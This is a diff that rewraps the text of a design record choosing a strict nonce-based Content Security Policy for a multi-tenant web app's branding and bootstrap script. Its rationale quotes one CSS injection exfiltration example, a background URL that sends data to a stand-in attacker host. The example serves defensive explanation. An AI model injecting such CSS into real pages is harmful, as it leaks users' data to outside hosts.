@@ -35,7 +35,7 @@ apps/web/src/app/(portal)/layout.tsx   the same pair
 
 The `<style>` nodes are load-bearing for correctness, not decoration: they carry
 the resolved brand under `:root:not(.dark)` and the tenant override layered over
-it, and they are emitted *before* any paint-affecting node so the tenant never
+it, and they are emitted _before_ any paint-affecting node so the tenant never
 sees a flash of the wrong brand. `apps/web/src/app/layout.test.tsx` pins that
 ordering. A policy of `style-src 'self'` blocks both nodes and the tenant loses
 its brand on first paint.
@@ -51,21 +51,21 @@ be removed?
 
 ## Options
 
-**A. Strict nonce on `script-src` and `style-src`.** Middleware mints a nonce per
-request, sets the policy header, and every inline node in every layout carries
-`nonce={...}`. No `unsafe-inline` anywhere.
+**A. Strict nonce on `script-src` and `style-src`.** Middleware mints a nonce
+per request, sets the policy header, and every inline node in every layout
+carries `nonce={...}`. No `unsafe-inline` anywhere.
 
-**B. Nonce on `script-src`, `unsafe-inline` on `style-src`.** Script execution is
-controlled (the real XSS vector) while styles stay permissive because Next and
-the branding layer need them.
+**B. Nonce on `script-src`, `unsafe-inline` on `style-src`.** Script execution
+is controlled (the real XSS vector) while styles stay permissive because Next
+and the branding layer need them.
 
-**C. Confinement directives only.** `frame-ancestors 'none'`, `object-src 'none'`,
-`base-uri 'self'`, `form-action 'self'`. No `script-src` and no `style-src`, so
-nothing can break — and nothing is mitigated except clickjacking, plugin
-injection and base-tag hijacking.
+**C. Confinement directives only.** `frame-ancestors 'none'`,
+`object-src 'none'`, `base-uri 'self'`, `form-action 'self'`. No `script-src`
+and no `style-src`, so nothing can break — and nothing is mitigated except
+clickjacking, plugin injection and base-tag hijacking.
 
-**D. Static hash of the bootstrap script, `unsafe-inline` on styles.** Avoids the
-middleware by hashing `appearanceBootstrapScriptWithTenantDefault(...)`.
+**D. Static hash of the bootstrap script, `unsafe-inline` on styles.** Avoids
+the middleware by hashing `appearanceBootstrapScriptWithTenantDefault(...)`.
 
 ## Decision
 
@@ -80,25 +80,26 @@ middleware by hashing `appearanceBootstrapScriptWithTenantDefault(...)`.
    guarantee is preserved: the nonce attribute does not move the node.
 3. **No `unsafe-inline` on `script-src` or `style-src`.** A policy that leaves
    `style-src` open still permits CSS-injection data exfiltration
-   (`background: url(https://attacker/?data=...)`), which is exactly the class of
-   leak a CSP is expected to close on a surface that renders tenant-supplied
+   (`background: url(https://attacker/?data=...)`), which is exactly the class
+   of leak a CSP is expected to close on a surface that renders tenant-supplied
    branding values.
 4. **The policy is a constant in one module and asserted verbatim by a test.**
    The test fails if anyone weakens a directive, which is the failure mode that
    matters: a quietly-added `unsafe-inline` is invisible in review and fatal to
    the control.
-5. **Confinement directives come along**: `default-src 'self'`, `object-src 'none'`,
-   `base-uri 'self'`, `frame-ancestors 'none'`, `form-action 'self'`. PRD §29's
-   `img-src` allowance is explicit rather than inferred, because branding assets
-   are served from the S3 bucket through signed URLs.
+5. **Confinement directives come along**: `default-src 'self'`,
+   `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`,
+   `form-action 'self'`. PRD §29's `img-src` allowance is explicit rather than
+   inferred, because branding assets are served from the S3 bucket through
+   signed URLs.
 
 ## Rejected: D, and why
 
 The bootstrap script embeds the tenant's resolved default appearance
 (`appearanceBootstrapScriptWithTenantDefault(defaultAppearance)`), so its bytes
 differ per tenant and per appearance setting. A static `sha256-` hash would
-therefore have to be computed per tenant per request — which is a nonce with more
-steps and a second cache to invalidate.
+therefore have to be computed per tenant per request — which is a nonce with
+more steps and a second cache to invalidate.
 
 Also rejected: developing against `Content-Security-Policy-Report-Only` in
 production. A report-only header mitigates nothing and reads, in a deployment
